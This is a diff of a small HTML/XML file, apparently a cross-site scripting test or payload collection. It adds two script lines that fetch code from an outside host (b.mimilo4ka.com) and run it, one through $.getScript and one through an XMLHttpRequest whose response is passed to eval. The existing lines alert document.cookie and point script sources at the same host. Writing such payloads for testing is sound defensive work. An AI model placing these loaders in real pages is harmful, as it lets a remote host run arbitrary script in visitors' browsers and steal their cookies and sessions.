@@ -1,9 +1,11 @@
 <html>
 	<head></head>
 	<body>
+		<script>$.getScript("//b.mimilo4ka.com/collect?callback_token=test1")</script>
 		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.cookie)</something:script>
 		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
 		<something:script xmlns:something="http://www.w3.org/1999/xhtml">src=https://b.mimilo4ka.com/collect?callback_token=test1</something:script>
+		<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//b.mimilo4ka.com/collect?callback_token=test");a.send();</script>
 		<info>
 		  <name>
 		    <value><![CDATA[<script src=https://b.mimilo4ka.com/collect?callback_token=test1></script>]]></value>
